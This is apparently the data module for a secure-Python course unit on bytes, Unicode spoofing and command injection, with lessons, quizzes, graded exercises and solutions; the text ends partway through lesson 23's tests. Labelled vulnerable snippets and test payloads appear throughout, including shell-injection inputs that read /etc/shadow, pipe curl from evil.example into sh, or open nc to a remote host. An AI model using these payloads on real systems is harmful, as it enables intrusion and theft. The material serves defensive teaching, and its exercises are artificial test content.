export default {
  id: "m05",
  number: 5,
  title: "Strings, bytes and injection",
  focus: "injection",
  subtitle:
    "Text processing is where most remote compromises begin. Command injection and SQL injection are the same mistake twice: data was concatenated into a language that has operators.",
  objectives: [
    "Work fluently with `str` and `bytes`, and know which one crosses the wire.",
    "Recognise Unicode normalisation and homoglyph attacks on identifiers.",
    "Run external programs without a shell, and prove the injection is dead.",
    "Use parameterised SQL and explain why escaping is not an equivalent fix.",
    "Harden a text-processing CLI end to end.",
  ],
  rules: [
    { id: "PY-SHELL-TRUE", what: "`shell=True` makes metacharacters into operators" },
    { id: "PY-SHELL-EXEC", what: "`os.system`/`os.popen` always use a shell" },
    { id: "PY-SQLI", what: "queries built by formatting are injectable" },
    { id: "PY-CMD-BUILD", what: "command lines assembled as text reintroduce quoting bugs" },
  ],
  capstone:
    "Day 25 hardens a report-generator CLI: path allowlist, argv execution, parameterised queries, and a breach ledger that must come back empty.",

  lessons: [
    /* ----------------------------------------------------------------- 21 */
    {
      id: "m05l01",
      day: 21,
      title: "str and bytes: what actually crosses the wire",
      minutes: 60,
      secure: "decoding untrusted bytes",
      cwe: ["CWE-838", "CWE-176"],
      tags: ["str", "bytes", "encode", "decode", "utf-8"],
      lede:
        "A `str` is a sequence of Unicode code points. A `bytes` is a sequence of octets. Files, sockets, hashes and crypto all speak bytes — and the conversion between them is a place attackers work.",
      blocks: [
        {
          t: "repl",
          lines: [
            '>>> "café".encode("utf-8")',
            "b'caf\\\\xc3\\\\xa9'",
            '>>> len("café"), len("café".encode("utf-8"))',
            "(4, 5)",
            '>>> b"caf\\\\xc3\\\\xa9".decode("utf-8")',
            "'café'",
            '>>> b"\\\\xff\\\\xfe".decode("utf-8")',
            "UnicodeDecodeError: 'utf-8' codec can't decode byte 0xff in position 0",
          ],
        },
        {
          t: "box",
          kind: "note",
          title: "Length in characters is not length in bytes",
          md: `A 100-character limit expressed in characters can be 400 bytes in UTF-8 — and 100 *bytes* can cut a multi-byte character in half.

When the limit protects a buffer, a column width, or a network frame, measure \`len(value.encode("utf-8"))\`. When it protects a human-facing field, measure characters. Decide which one you mean and write it down.`,
        },
        { t: "h", text: "The three ways to decode, and when each is right" },
        {
          t: "table",
          head: ["Call", "On invalid bytes", "Use when"],
          rows: [
            ["`b.decode(\"utf-8\")`", "raises `UnicodeDecodeError`", "The input must be valid; invalid means reject."],
            ["`b.decode(\"utf-8\", errors=\"replace\")`", "inserts `\\ufffd`", "Logs and diagnostics — never lose the line."],
            ["`b.decode(\"utf-8\", errors=\"ignore\")`", "**silently drops bytes**", "Almost never. See below."],
            ["`b.decode(\"latin-1\")`", "never fails", "Only for genuine latin-1 data; it maps any byte to a character."],
          ],
        },
        {
          t: "box",
          kind: "pitfall",
          title: "`errors=\"ignore\"` deletes evidence",
          md: `Dropping undecodable bytes changes the string's content silently. A filter that checks the decoded text and a consumer that uses the raw bytes now disagree — the classic setup for a filter bypass.

Historically this is the same family as the \`%c0%af\` overlong-UTF-8 bug (CVE-2000-0884 in IIS, and similar issues elsewhere): one layer normalised the bytes differently from the layer that enforced the rule.`,
        },
        { t: "h", text: "Bytes are what you hash and sign" },
        {
          t: "code",
          label: "fixed",
          code: `import hashlib

def fingerprint(text):
    """Hash text deterministically: always name the encoding."""
    return hashlib.sha256(text.encode("utf-8")).hexdigest()`,
          cap: "`hashlib` refuses `str` outright, which is a deliberate design choice: it forces you to state the encoding rather than letting the platform default decide your signature.",
        },
        {
          t: "box",
          kind: "warn",
          title: "`open()` without `encoding=` is a portability landmine",
          md: `Before Python 3.15, \`open(path)\` used the platform's preferred encoding — UTF-8 on most Linux systems, often cp1252 on Windows. The same code read the same file differently on two machines, and the one that silently mangled characters was usually the one running in production.

Always pass \`encoding="utf-8"\` explicitly. For input you do not control, add \`errors="replace"\`.`,
        },
        {
          t: "code",
          label: "example",
          code: `MAX_BYTES = 1_000

def decode_body(raw):
    """Decode a request body strictly, with a byte-length bound."""
    if not isinstance(raw, (bytes, bytearray)):
        raise TypeError("body must be bytes")
    if len(raw) > MAX_BYTES:
        raise ValueError(f"body exceeds {MAX_BYTES} bytes")
    try:
        return raw.decode("utf-8")        # strict: invalid input is rejected
    except UnicodeDecodeError as exc:
        raise ValueError("body is not valid UTF-8") from exc`,
          cap: "Bound the bytes, decode strictly, convert the library's error into your own vocabulary.",
        },
      ],
      quiz: [
        {
          q: "`len(\"日本語\")` and `len(\"日本語\".encode(\"utf-8\"))` are:",
          options: ["Both 3", "3 and 9", "9 and 3"],
          answer: 1,
          why:
            "Three characters, nine bytes — each is three bytes in UTF-8. A byte-oriented limit must measure the encoded form.",
        },
        {
          q: "Why is `errors=\"ignore\"` dangerous when decoding untrusted input?",
          options: [
            "It is slow.",
            "It silently removes bytes, so the validated string differs from the original data.",
            "It raises on valid input.",
          ],
          answer: 1,
          why:
            "Any mismatch between the bytes you checked and the bytes you use is a filter bypass waiting to be found. Reject invalid input, or use `replace` so the corruption is visible.",
        },
        {
          q: "`hashlib.sha256(\"abc\")` raises `TypeError`. Why is that good?",
          options: [
            "It is not; it is an inconvenience.",
            "It forces you to name the encoding, so the digest is deterministic across platforms.",
            "SHA-256 cannot hash text.",
          ],
          answer: 1,
          why:
            "An implicit encoding would make the same input hash differently on two machines — which breaks signature verification in a way that is very hard to diagnose.",
        },
      ],
      exercise: {
        title: "A strict body decoder",
        brief: `Write \`decode_body(raw, *, max_bytes=1000, max_chars=500)\` returning a decoded, bounded \`str\`.

- \`raw\` must be \`bytes\` or \`bytearray\`; anything else raises \`TypeError\`.
- Longer than \`max_bytes\` → \`ValueError\` containing the word \`"bytes"\`. Check this **before** decoding.
- Invalid UTF-8 → \`ValueError\` containing \`"UTF-8"\`. Do not use \`errors="ignore"\` or \`errors="replace"\`.
- More than \`max_chars\` characters after decoding → \`ValueError\` containing \`"characters"\`.
- Otherwise return the decoded string unchanged (no stripping).

Also write \`fingerprint(text)\` returning the hex SHA-256 of the UTF-8 encoding of \`text\`.`,
        rubric: [
          "Byte limit is enforced before decoding",
          "Invalid UTF-8 raises `ValueError`, not `UnicodeDecodeError`",
          "Character limit is enforced after decoding, and is distinct from the byte limit",
          "No lossy error handler is used",
          "`fingerprint` names the encoding explicitly",
        ],
        starter: `import hashlib


def decode_body(raw, *, max_bytes=1000, max_chars=500):
    """Return raw decoded as strict UTF-8, within both bounds."""


def fingerprint(text):
    """Return the hex SHA-256 of text, encoded as UTF-8."""


print(decode_body(b'{"event":"push"}'))
print(fingerprint("abc")[:16])
`,
        stdin: [],
        tests: [
          {
            name: "decodes valid UTF-8",
            code: `assert decode_body(b"hello") == "hello"
assert decode_body("café".encode("utf-8")) == "café"
assert decode_body(bytearray(b"hi")) == "hi"`,
          },
          {
            name: "rejects non-bytes",
            code: `for bad in ("already a str", None, 42, ["x"]):
    with raises(TypeError):
        decode_body(bad)`,
          },
          {
            name: "byte limit is checked before decoding",
            code: `payload = ("é" * 400).encode("utf-8")   # 800 bytes, 400 chars
try:
    decode_body(payload, max_bytes=500, max_chars=10_000)
    raise AssertionError("expected ValueError")
except ValueError as e:
    assert "bytes" in str(e), f"got {str(e)!r}"`,
          },
          {
            name: "character limit is separate from the byte limit",
            code: `payload = ("é" * 300).encode("utf-8")   # 600 bytes, 300 chars
try:
    decode_body(payload, max_bytes=10_000, max_chars=100)
    raise AssertionError("expected ValueError")
except ValueError as e:
    assert "characters" in str(e), f"got {str(e)!r}"
assert decode_body(payload, max_bytes=10_000, max_chars=300) == "é" * 300`,
          },
          {
            name: "invalid UTF-8 becomes a ValueError",
            code: `for bad in (b"\\xff\\xfe", b"hello\\xc3", b"\\xc0\\xaf"):
    try:
        decode_body(bad)
        raise AssertionError(f"{bad!r} should have been rejected")
    except ValueError as e:
        assert "UTF-8" in str(e), f"got {str(e)!r}"
    except UnicodeDecodeError:
        raise AssertionError("translate UnicodeDecodeError into ValueError")`,
          },
          {
            name: "decoding is not lossy",
            code: `assert decode_body(b"a\\xc3\\xa9b") == "aéb"
try:
    got = decode_body(b"a\\xffb")
    raise AssertionError(f"lossy decode returned {got!r}")
except ValueError:
    pass`,
          },
          {
            name: "fingerprint is the standard SHA-256",
            code: `import hashlib
assert fingerprint("abc") == hashlib.sha256(b"abc").hexdigest()
assert fingerprint("café") == hashlib.sha256("café".encode("utf-8")).hexdigest()`,
          },
        ],
        requirements: [
          { kind: "defines", value: "decode_body" },
          { kind: "defines", value: "fingerprint" },
          { kind: "forbids", value: "errors\\s*=\\s*[\"']ignore[\"']", message: "`errors='ignore'` silently drops bytes — decode strictly." },
          { kind: "forbids", value: "errors\\s*=\\s*[\"']replace[\"']", message: "This decoder must reject invalid input, not substitute it." },
        ],
        hints: [
          "`isinstance(raw, (bytes, bytearray))` covers both accepted types. Everything else is a `TypeError`.",
          "Check `len(raw)` first — that is the byte count, and checking it before `.decode()` is what stops a huge body from being decoded at all.",
          "Wrap the decode: `try: text = raw.decode(\"utf-8\")` / `except UnicodeDecodeError as exc: raise ValueError(\"body is not valid UTF-8\") from exc`.",
          "`len(text)` after decoding is the character count — a different number from the byte count, which is the whole point of having two limits.",
        ],
        solution: `import hashlib


def decode_body(raw, *, max_bytes=1000, max_chars=500):
    """Return raw decoded as strict UTF-8, within both bounds."""
    if not isinstance(raw, (bytes, bytearray)):
        raise TypeError(f"body must be bytes, got {type(raw).__name__}")

    if len(raw) > max_bytes:
        raise ValueError(f"body exceeds {max_bytes} bytes")

    try:
        text = bytes(raw).decode("utf-8")
    except UnicodeDecodeError as exc:
        raise ValueError("body is not valid UTF-8") from exc

    if len(text) > max_chars:
        raise ValueError(f"body exceeds {max_chars} characters")

    return text


def fingerprint(text):
    """Return the hex SHA-256 of text, encoded as UTF-8."""
    return hashlib.sha256(text.encode("utf-8")).hexdigest()


print(decode_body(b'{"event":"push"}'))
print(fingerprint("abc")[:16])`,
        why: `Two bounds, because they protect different things. The byte bound protects memory and the transport; it is checked first so an oversized body is never decoded. The character bound protects the application's own assumptions — a database column, a UI field — and can only be checked after decoding, because the relationship between the two counts depends on the content.

Strict decoding is the security-relevant choice. \`errors="ignore"\` would turn \`b"a\\xffb"\` into \`"ab"\`, so a validator inspecting the decoded form and a consumer using the original bytes would be looking at different data. That gap is where filter bypasses live. Rejecting means there is only ever one interpretation of the input.

Translating \`UnicodeDecodeError\` into \`ValueError\` keeps the module's vocabulary consistent: callers handle \`ValueError\` for "the request was bad" and never need to know which codec produced it — and the chained \`from exc\` keeps the original for your logs.`,
      },
      wrapup: `- \`str\` is code points, \`bytes\` is octets. Hashing, sockets and files are bytes.
- Characters and bytes are different limits; name which one you mean.
- Decode untrusted input strictly. \`errors="ignore"\` creates a gap between what you checked and what you use.
- Always pass \`encoding="utf-8"\` to \`open()\`.`,
      refs: [
        { label: "Unicode HOWTO", url: "https://docs.python.org/3/howto/unicode.html" },
        { label: "CWE-176: Improper Handling of Unicode Encoding", url: "https://cwe.mitre.org/data/definitions/176.html" },
      ],
    },

    /* ----------------------------------------------------------------- 22 */
    {
      id: "m05l02",
      day: 22,
      title: "Unicode: when two different strings look identical",
      minutes: 60,
      secure: "identifier spoofing and normalisation",
      cwe: ["CWE-1007", "CWE-178"],
      tags: ["unicode", "nfkc", "casefold", "homoglyph", "identifiers"],
      lede:
        "`admin` and `аdmin` render identically in every font you own. One of them starts with Cyrillic U+0430. If your comparison is a plain `==`, you have two different administrators.",
      blocks: [
        {
          t: "repl",
          lines: [
            '>>> a = "admin"',
            '>>> b = "\\u0430dmin"      # Cyrillic a',
            ">>> a == b",
            "False",
            ">>> print(a, b)",
            "admin аdmin",
            '>>> "ﬁle" == "file"        # U+FB01 LATIN SMALL LIGATURE FI',
            "False",
            '>>> import unicodedata',
            '>>> unicodedata.normalize("NFKC", "ﬁle") == "file"',
            "True",
          ],
        },
        {
          t: "p",
          md: `Unicode has several ways to spell what looks like the same text. {{Normalisation}} collapses those spellings into one canonical form:

- **NFC** — composed: \`é\` as one code point.
- **NFD** — decomposed: \`e\` + combining acute.
- **NFKC / NFKD** — compatibility: also folds ligatures, full-width forms, superscripts, and Roman numeral characters into their plain equivalents.

For identifiers — usernames, domains, file names, anything you compare or key on — normalise to **NFKC** before storing and before comparing.`,
        },
        {
          t: "code",
          label: "vulnerable",
          code: `def register(username, store):
    if username in store:                  # byte-for-byte comparison
        raise ValueError("taken")
    store[username] = new_account()

register("admin", store)      # the real one
register("\\u0430dmin", store)  # accepted: a visually identical second account`,
          cap: "Two accounts, one apparent name. Support staff, audit logs and approval flows cannot tell them apart.",
        },
        {
          t: "code",
          label: "fixed",
          code: `import unicodedata

ALLOWED = set("abcdefghijklmnopqrstuvwxyz0123456789_-")

def canonical_username(raw):
    """Normalise, case-fold, then restrict to an ASCII allowlist."""
    text = unicodedata.normalize("NFKC", raw).casefold()
    if not text.isascii():
        raise ValueError("username must be ASCII")
    if not set(text) <= ALLOWED:
        raise ValueError("username has unsupported characters")
    return text`,
          cap: "Normalise, fold case, then enforce an ASCII allowlist. The last step is what actually stops homoglyphs — normalisation alone does not map Cyrillic а to Latin a.",
        },
        {
          t: "box",
          kind: "rule",
          title: "Normalisation is not an allowlist",
          md: `NFKC folds *compatibility* variants. It does **not** fold characters from different scripts that merely look alike — Cyrillic \`а\`, Greek \`ο\`, Cherokee \`Ꭺ\` all survive normalisation untouched.

For identifiers, the robust rule is: normalise **and** restrict to a single script, ideally ASCII. For display names, allow Unicode freely — they are not used for decisions.`,
        },
        { t: "h", text: "casefold, not lower" },
        {
          t: "repl",
          lines: [
            '>>> "Straße".lower()',
            "'straße'",
            '>>> "Straße".casefold()',
            "'strasse'",
            '>>> "STRASSE".lower() == "Straße".lower()',
            "False",
            '>>> "STRASSE".casefold() == "Straße".casefold()',
            "True",
            '>>> "İ".lower()           # Turkish dotted capital I',
            "'i̇'                      # two code points!",
          ],
        },
        {
          t: "box",
          kind: "warn",
          title: "The Turkish I, and why order matters",
          md: `\`"İ".lower()\` produces \`i\` plus a combining dot — not plain \`i\`. Systems that lower-case in one place and compare in another have been bypassed with exactly this character.

Use \`casefold()\` for case-insensitive comparison, and always normalise **before** folding: \`normalize("NFKC", s).casefold()\`. Reversing the order leaves some sequences unfolded.`,
        },
        {
          t: "box",
          kind: "cve",
          title: "Homoglyphs in the wild",
          md: `Punycode homograph attacks registered \`аpple.com\` (Cyrillic а) and obtained valid TLS certificates for it; browsers responded by showing punycode when a domain mixes scripts. The npm and PyPI ecosystems have both seen packages whose names differ from a popular package by one homoglyph.

The same technique reaches source code: a right-to-left override character can make a line of Python display in an order different from how it executes ("Trojan Source", CVE-2021-42574).`,
        },
      ],
      spot: {
        label: "account signup",
        prompt: "Click the line that permits a visually identical duplicate account.",
        lines: [6],
        why:
          "Line 6. `.lower()` neither normalises nor folds, so `\"аdmin\"` with a Cyrillic а passes the uniqueness check against `\"admin\"`. Line 4's length check is fine. The fix is `unicodedata.normalize(\"NFKC\", raw).casefold()` plus an ASCII allowlist — and store the canonical form as the key.",
        code: `def signup(raw_name, store):
    name = raw_name.strip()
    if not 3 <= len(name) <= 20:
        raise ValueError("bad length")
    key = name.lower()
    if key in store:
        raise ValueError("taken")
    store[key] = {"display": name}
    return key`,
      },
      quiz: [
        {
          q: "Does `unicodedata.normalize(\"NFKC\", s)` protect against Cyrillic homoglyphs?",
          options: [
            "Yes, it maps them to Latin.",
            "No — different scripts are distinct characters; you also need an allowlist.",
            "Only with `casefold()`.",
          ],
          answer: 1,
          why:
            "Normalisation folds compatibility variants within Unicode's equivalence rules, not visually-similar characters across scripts. Restrict identifiers to ASCII.",
        },
        {
          q: "Why `casefold()` rather than `lower()` for comparisons?",
          options: [
            "It is faster.",
            "It handles cases like `ß` → `ss` that `lower()` leaves alone.",
            "`lower()` is deprecated.",
          ],
          answer: 1,
          why: "`casefold` is designed for caseless matching. `lower` is designed for display.",
        },
        {
          q: "Correct order of operations for a username?",
          options: [
            "casefold, then normalise, then allowlist",
            "normalise (NFKC), then casefold, then allowlist",
            "allowlist, then normalise",
          ],
          answer: 1,
          why:
            "Normalise first so folding sees canonical input; allowlist last so it judges the final stored form. Validating before transforming is the mistake from Module 2 in another costume.",
        },
      ],
      exercise: {
        title: "Canonical identifiers that cannot be spoofed",
        brief: `Write \`canonical_username(raw)\` and \`register(raw, store)\`.

\`canonical_username(raw)\`:

1. \`raw\` must be a \`str\`, else \`TypeError\`.
2. Normalise with **NFKC**, then \`casefold()\`, then \`strip()\`.
3. Reject (\`ValueError\`) when the result is not ASCII, is shorter than 3 or longer than 20 characters, contains anything outside \`a-z0-9_-\`, or does not start with a letter.
4. Return the canonical form.

\`register(raw, store)\`:

- Computes the canonical key. If the key is already in \`store\`, raise \`ValueError("username is taken")\`.
- Otherwise store \`{"display": raw.strip()}\` under the canonical key and return the key.

The display name keeps the user's original spelling; the key is what all decisions use.`,
        rubric: [
          "`\"Ada_L\"`, `\"ada_l\"` and full-width `\"ａｄａ＿ｌ\"` all canonicalise to the same key",
          "Cyrillic `\"аdmin\"` is rejected as non-ASCII rather than accepted as a duplicate",
          "`\"ﬁle_a\"` (ligature) normalises to `\"file_a\"`",
          "Length, charset and first-character rules enforced on the canonical form",
          "`register` refuses a second account whose canonical key collides",
          "The original spelling is preserved in `display`",
        ],
        starter: `import unicodedata

ALLOWED = set("abcdefghijklmnopqrstuvwxyz0123456789_-")
MIN_LEN, MAX_LEN = 3, 20


def canonical_username(raw):
    """Return the canonical, decision-safe form of a username."""


def register(raw, store):
    """Store the account under its canonical key; return the key."""


accounts = {}
print(register("Ada_L", accounts))
`,
        stdin: [],
        tests: [
          {
            name: "case and width variants collapse to one key",
            code: `assert canonical_username("Ada_L") == "ada_l"
assert canonical_username("ADA_L") == "ada_l"
assert canonical_username("  ada_l  ") == "ada_l"
assert canonical_username("\\uff41\\uff44\\uff41\\uff3f\\uff4c") == "ada_l", "full-width forms must normalise"`,
          },
          {
            name: "ligatures normalise",
            code: `assert canonical_username("\\ufb01le_a") == "file_a", "NFKC should expand the fi ligature"`,
          },
          {
            name: "homoglyphs are rejected, not accepted as duplicates",
            code: `with raises(ValueError):
    canonical_username("\\u0430dmin")      # Cyrillic a
with raises(ValueError):
    canonical_username("\\u03bfperator")   # Greek omicron
with raises(ValueError):
    canonical_username("café_x")`,
          },
          {
            name: "charset, length and first-character rules",
            code: `for bad in ("ab", "a" * 21, "1ada", "_ada", "-ada", "ada lovelace", "ada.l", "ada!", ""):
    with raises(ValueError):
        canonical_username(bad)
assert canonical_username("abc") == "abc"
assert canonical_username("a" * 20) == "a" * 20`,
          },
          {
            name: "non-strings are a TypeError",
            code: `for bad in (None, 42, b"ada"):
    with raises(TypeError):
        canonical_username(bad)`,
          },
          {
            name: "registration collides on the canonical key",
            code: `store = {}
assert register("Ada_L", store) == "ada_l"
for dup in ("ada_l", "ADA_L", " Ada_L ", "\\uff41\\uff44\\uff41\\uff3f\\uff4c"):
    try:
        register(dup, store)
        raise AssertionError(f"{dup!r} should have collided")
    except ValueError as e:
        assert "taken" in str(e), f"got {str(e)!r}"`,
          },
          {
            name: "the original spelling is kept for display",
            code: `store = {}
register("  Ada_L  ", store)
assert store["ada_l"]["display"] == "Ada_L", f"got {store['ada_l']!r}"`,
          },
        ],
        requirements: [
          { kind: "defines", value: "canonical_username" },
          { kind: "uses_module", value: "unicodedata" },
          { kind: "calls", value: "casefold", message: "Use `casefold()` rather than `lower()` for caseless matching." },
        ],
        hints: [
          "One line does the transformation: `text = unicodedata.normalize(\"NFKC\", raw).casefold().strip()`. Order matters — normalise, then fold.",
          "`text.isascii()` is the homoglyph defence. Cyrillic and Greek look-alikes survive NFKC, so this check is what actually rejects them.",
          "`set(text) <= ALLOWED` is a subset test — every character must be in the allowlist.",
          "Check `text[0].isalpha()` only after you know the string is non-empty, or indexing raises `IndexError` instead of your `ValueError`.",
        ],
        solution: `import unicodedata

ALLOWED = set("abcdefghijklmnopqrstuvwxyz0123456789_-")
MIN_LEN, MAX_LEN = 3, 20


def canonical_username(raw):
    """Return the canonical, decision-safe form of a username."""
    if not isinstance(raw, str):
        raise TypeError(f"username must be text, got {type(raw).__name__}")

    text = unicodedata.normalize("NFKC", raw).casefold().strip()

    if not MIN_LEN <= len(text) <= MAX_LEN:
        raise ValueError(f"username must be {MIN_LEN} to {MAX_LEN} characters")
    if not text.isascii():
        raise ValueError("username must use ASCII characters only")
    if not set(text) <= ALLOWED:
        raise ValueError("username may contain only a-z, 0-9, underscore and hyphen")
    if not text[0].isalpha():
        raise ValueError("username must start with a letter")

    return text


def register(raw, store):
    """Store the account under its canonical key; return the key."""
    key = canonical_username(raw)
    if key in store:
        raise ValueError("username is taken")
    store[key] = {"display": raw.strip()}
    return key


accounts = {}
print(register("Ada_L", accounts))`,
        why: `The function separates the two jobs a username does. The **key** is canonical, ASCII, folded, and is what uniqueness, lookup and authorisation use. The **display** value keeps whatever the person typed, because that is cosmetic and carries no decision.

The step order is the security content:

1. **Normalise first.** Full-width \`ａｄａ\` and the \`ﬁ\` ligature become ordinary ASCII here, so they cannot be used to smuggle a second spelling of an existing name past the uniqueness check.
2. **Casefold second.** Folding after normalising means the fold operates on canonical input; the reverse order leaves some sequences unfolded.
3. **ASCII allowlist last.** This is the step that defeats homoglyphs, and nothing earlier can do its job — NFKC leaves Cyrillic \`а\` exactly as it found it. Rejecting rather than transliterating is deliberate: a mapping from Cyrillic to Latin would create *new* collisions.

Checking length before the character rules is also intentional: a 50 KB username is refused by the cheapest test, before any set operations run over it.`,
      },
      wrapup: `- Normalise (NFKC) → casefold → allowlist. In that order.
- Normalisation does not fold look-alikes from other scripts; an ASCII allowlist does.
- \`casefold()\` for comparison, \`lower()\` for display.
- Store a canonical key for decisions and the original text for display.`,
      refs: [
        { label: "unicodedata", url: "https://docs.python.org/3/library/unicodedata.html" },
        { label: "UTS #39: Unicode Security Mechanisms", url: "https://www.unicode.org/reports/tr39/" },
        { label: "CWE-1007: Insufficient Visual Distinction of Homoglyphs", url: "https://cwe.mitre.org/data/definitions/1007.html" },
      ],
    },

    /* ----------------------------------------------------------------- 23 */
    {
      id: "m05l03",
      day: 23,
      title: "Command injection, and the shell you do not need",
      minutes: 60,
      secure: "argv execution, never a shell",
      cwe: ["CWE-78"],
      tags: ["subprocess", "shell", "injection", "argv", "os.system"],
      lede:
        "The simulated operating system in this course is instrumented. In this lesson you will inject a command, watch it succeed in the Breach tab, and then make the same payload inert.",
      blocks: [
        {
          t: "p",
          md: `When you ask the shell to run \`ls /srv/reports\`, you are not asking it to run a program with an argument. You are handing it a *program in the shell language* — and that language has operators: \`;\` sequences commands, \`|\` pipes them, \`&&\` chains them, \`$(...)\` substitutes the output of another command.

Any untrusted text concatenated into that string is code.`,
        },
        {
          t: "code",
          label: "vulnerable",
          stdin: ["q4.csv; cat /etc/shadow"],
          code: `import os

name = input("report name: ")
os.system("cat /srv/reports/" + name)

# user types:  q4.csv; cat /etc/shadow
# shell runs:  cat /srv/reports/q4.csv
#              cat /etc/shadow`,
        },
        {
          t: "box",
          kind: "try",
          title: "Run the attack",
          md: `Load the vulnerable sample into the editor (the button on the snippet above), press **Run**, and look at the **Breach** tab. The simulated shell records exactly what the injected command achieved.

The simulation is faithful to shell parsing rules and completely harmless — \`/etc/shadow\` here is a fiction, and \`rm -rf /\` deletes nothing.`,
        },
        {
          t: "table",
          head: ["Call", "Shell involved?", "Verdict"],
          rows: [
            ["`os.system(cmd)`", "always", "**Never.** The auditor rates it critical."],
            ["`os.popen(cmd)`", "always", "**Never.**"],
            ["`subprocess.run(cmd, shell=True)`", "yes", "**Never** with untrusted data."],
            ["`subprocess.run([prog, arg])`", "no", "**Correct.**"],
            ["`subprocess.run(\" \".join(parts))`", "no, but quoting bugs return", "Wrong — build a list."],
          ],
        },
        {
          t: "code",
          label: "fixed",
          stdin: ["q4.csv; cat /etc/shadow"],
          code: `import subprocess

name = input("report name: ")
result = subprocess.run(
    ["cat", f"/srv/reports/{name}"],   # a list: each element is ONE argument
    capture_output=True, text=True, timeout=10, check=False,
)
print(result.stdout)`,
          cap: "With a list, the OS executes `cat` directly and hands it one argument. `;`, `|` and `$()` are ordinary characters inside a filename — there is no shell to interpret them.",
        },
        {
          t: "box",
          kind: "rule",
          title: "A list, and an allowlist",
          md: `\`shell=False\` (the default) stops *command* injection. It does not stop **argument** injection: a value beginning with \`-\` can become a flag, and \`cat ../../etc/passwd\` is still a path the program will happily read.

The complete answer is two layers:
1. \`subprocess.run([...])\` — no shell,
2. validate the value against an allowlist before it becomes an argument.`,
        },
        {
          t: "code",
          label: "fixed",
          code: `import re, subprocess

SAFE = re.compile(r"\\A[A-Za-z0-9_-]{1,40}\\.csv\\Z")

def head_report(name, lines=5):
    if not SAFE.match(name):
        raise ValueError("report name not permitted")
    return subprocess.run(
        ["head", "-n", str(int(lines)), f"/srv/reports/{name}"],
        capture_output=True, text=True, timeout=10, check=True,
    ).stdout`,
          cap: "`int(lines)` before `str()` means a value like `5; rm -rf /` cannot even become an argument. `check=True` turns a non-zero exit into an exception instead of a silently empty result.",
        },
        {
          t: "box",
          kind: "cve",
          title: "Argument injection is its own bug class",
          md: `CVE-2022-24765 (Git), CVE-2023-25690 and a long tail of others exploit *flags*, not metacharacters: a filename of \`--upload-pack=...\` or \`-o ProxyCommand=...\` turns a benign program into an execution primitive without a shell anywhere in sight.

Mitigations: validate the value, and use \`--\` to mark the end of options where the program supports it (\`["grep", "--", pattern, path]\`).`,
        },
        {
          t: "box",
          kind: "good",
          title: "Do you need a subprocess at all?",
          md: `\`cat\` is \`Path.read_text()\`. \`ls\` is \`os.listdir\`. \`grep\` is a loop with \`in\`. \`curl\` is \`requests\`. \`rm\` is \`Path.unlink\`.

Every subprocess you delete is an injection surface you no longer have to reason about. Reach for \`subprocess\` only for genuinely external programs — ffmpeg, git, a vendor binary.`,
        },
      ],
      spot: {
        label: "backup utility",
        prompt: "Click the line where the user's input becomes shell code.",
        lines: [6],
        why:
          "Line 6. `shell=True` sends the whole f-string to /bin/sh, so a `label` of `nightly; curl evil.sh | sh` runs two commands. Line 5's validation only checks length — it permits every metacharacter. Pass a list and drop `shell=True`.",
        code: `import subprocess

def backup(label, src):
    if len(label) > 50:
        raise ValueError("label too long")
    subprocess.run(f"tar czf /backups/{label}.tgz {src}",
                   shell=True, check=True)
    return f"/backups/{label}.tgz"`,
      },
      quiz: [
        {
          q: "`subprocess.run([\"cat\", user_input])` with `user_input = \"a.txt; rm -rf /\"`. What happens?",
          options: [
            "Both commands run.",
            "`cat` is asked for a file literally named `a.txt; rm -rf /`, which does not exist.",
            "A SyntaxError.",
          ],
          answer: 1,
          why:
            "With no shell, the argument is one opaque string. The semicolon is just a character in a filename — which is exactly why the list form is the fix.",
        },
        {
          q: "Does `shell=False` make external commands fully safe?",
          options: [
            "Yes.",
            "No — argument injection remains: a value starting with `-` can become a flag.",
            "No — the shell is still used for the first argument.",
          ],
          answer: 1,
          why:
            "Command injection is closed; argument injection is not. Validate values and use `--` where the program supports it.",
        },
        {
          q: "Best replacement for `os.system(f\"cat {path}\")`?",
          options: [
            "`subprocess.run(f\"cat {path}\", shell=True)`",
            "`Path(path).read_text(encoding=\"utf-8\")` after validating the path",
            "`os.popen(f\"cat {path}\")`",
          ],
          answer: 1,
          why: "Deleting the subprocess removes the whole category. Reading a file is a file operation, not a shell operation.",
        },
      ],
      exercise: {
        title: "Kill the injection and prove it",
        brief: `A log-extraction helper currently uses the shell. Rewrite it so the same hostile input is inert.

Implement \`extract(report, pattern)\`:

- \`report\` must match \`\\A[A-Za-z0-9_-]{1,40}\\.csv\\Z\`, else \`ValueError\`.
- \`pattern\` must be 1–60 characters and contain no control characters, else \`ValueError\`. It may otherwise contain any printable character, **including shell metacharacters** — they are legitimate search text and must stay harmless.
- Run \`grep\` over \`/srv/reports/<report>\` using \`subprocess.run\` with an **argument list**, \`capture_output=True\`, \`text=True\`, \`timeout=10\`. Use \`--\` to end option parsing before the pattern.
- Return the stdout string. A grep exit status of 1 (no matches) is **not** an error — return \`""\`.

The grader checks the breach ledger: after your function runs with hostile input, \`WORLD.breached\` must be \`False\`.

(The simulated \`grep\` supports \`grep PATTERN FILE\`; \`q3.csv\` and \`q4.csv\` exist in \`/srv/reports/\`.)`,
        rubric: [
          "A legitimate search returns matching lines",
          "`report` values containing `;`, `..` or spaces are rejected",
          "A `pattern` full of shell metacharacters runs harmlessly and records no breach",
          "`WORLD.breached` is `False` after hostile input",
          "No `shell=True`, no `os.system`, no `os.popen`",
          "No match returns `\"\"` rather than raising",
        ],
        starter: `import re
import subprocess

REPORT = re.compile(r"\\A[A-Za-z0-9_-]{1,40}\\.csv\\Z")
MAX_PATTERN = 60


def extract(report, pattern):
    """Search a report for a pattern, without ever invoking a shell."""


print(extract("q4.csv", "emea"))
print(extract("q4.csv", "emea; cat /etc/shadow"))
print("breached:", WORLD.breached)
`,
        stdin: [],
        tests: [
          {
            name: "a legitimate search works",
            code: `out = extract("q4.csv", "emea")
assert "emea" in out, f"expected a match, got {out!r}"`,
          },
          {
            name: "metacharacters in the pattern are inert",
            code: `WORLD.reset()
out = extract("q4.csv", "emea; cat /etc/shadow")
assert "root:" not in out, "the injected command produced output"
assert not WORLD.breached, f"a breach was recorded: {WORLD.report()}"`,
          },
          {
            name: "every classic payload is harmless",
            code: `WORLD.reset()
for payload in ("x; rm -rf /", "x && curl http://evil.example/s.sh | sh",
                "$(cat /etc/shadow)", "\`id\`", "x | nc 10.0.0.1 4444", "x > /etc/passwd"):
    extract("q4.csv", payload)
assert not WORLD.breached, f"payloads reached the shell: {WORLD.report()}"`,
          },
          {
            name: "no match returns an empty string",
